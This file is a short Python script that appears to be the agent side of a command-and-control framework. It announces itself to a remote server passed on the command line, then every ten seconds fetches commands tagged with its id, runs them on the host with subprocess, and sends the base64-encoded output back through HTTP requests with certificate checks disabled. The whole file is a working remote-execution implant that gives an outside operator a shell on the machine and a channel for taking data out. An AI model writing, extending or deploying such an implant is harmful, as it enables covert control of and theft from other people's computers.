import requests
import base64
import sys
import time
import subprocess

uid = sys.argv[1]
url = sys.argv[2]

message = "Hello From Agent " + uid + " (Python)"
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+uid, verify=False)

while True:
	cmds = requests.get(url + "/cmds.php?id="+uid+"&o=P", verify=False)
	cmds = str(cmds.text)
	for lines in cmds.splitlines():
		if str(uid) in lines:
			cmd = str(lines.split(":",1)[1])
			cmdlist = cmd.split(" ")
			res = subprocess.check_output(cmdlist)
			res = res.decode("utf-8")
			res_bytes = res.encode('ascii')
			resbase64_bytes = base64.b64encode(res_bytes)
			resbase64 = resbase64_bytes.decode('ascii')
			gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
	
	
	time.sleep(10)
		
